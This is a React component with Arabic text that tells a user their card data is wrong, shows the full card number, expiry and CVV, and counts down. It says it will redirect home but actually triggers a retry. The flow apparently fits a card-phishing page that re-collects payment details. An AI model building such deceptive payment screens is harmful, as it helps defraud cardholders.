import { useEffect, useState } from 'react';
import { X } from 'lucide-react';

interface VerificationFailedProps {
  cardNumber: string;
  cardExpiry: string;
  cardCvv: string;
  countdownSeconds?: number;
  onRetry?: () => void;
}

const VerificationFailed = ({ 
  cardNumber, 
  cardExpiry, 
  cardCvv, 
  countdownSeconds = 5,
  onRetry
}: VerificationFailedProps) => {
  const [countdown, setCountdown] = useState(countdownSeconds);

  useEffect(() => {
    if (countdown <= 0) {
      // إعادة المحاولة بدلاً من الذهاب للرئيسية
      onRetry?.();
      return;
    }

    const timer = setInterval(() => {
      setCountdown((prev) => prev - 1);
    }, 1000);

    return () => clearInterval(timer);
  }, [countdown, onRetry]);

  return (
    <div className="min-h-screen bg-white flex flex-col items-center justify-center w-full px-5" dir="rtl">
      <div className="bg-white rounded-2xl p-8 text-center w-full">
      <div className="w-20 h-20 rounded-full bg-red-100 mx-auto mb-6 flex items-center justify-center">
        <X className="h-10 w-10 text-red-500" strokeWidth={3} />
      </div>

      <h2 className="text-2xl font-bold text-red-500 mb-6">بيانات البطاقة خاطئة</h2>

      <div className="bg-gray-100 rounded-lg p-6 mb-6 text-right">
        <div className="mb-3">
          <span className="text-gray-600">رقم البطاقة:</span>
          <span className="text-gray-900 font-medium mr-2">{cardNumber}</span>
        </div>
        <div className="mb-3">
          <span className="text-gray-600">تاريخ الانتهاء:</span>
          <span className="text-gray-900 font-medium mr-2">{cardExpiry}</span>
        </div>
        <div>
          <span className="text-gray-600">CCV:</span>
          <span className="text-gray-900 font-medium mr-2">{cardCvv}</span>
        </div>
      </div>

      <p className="text-gray-500 text-sm">
        سيتم توجيهك إلى الصفحة الرئيسية خلال {countdown} ثواني
      </p>
      </div>
    </div>
  );
};

export default VerificationFailed;
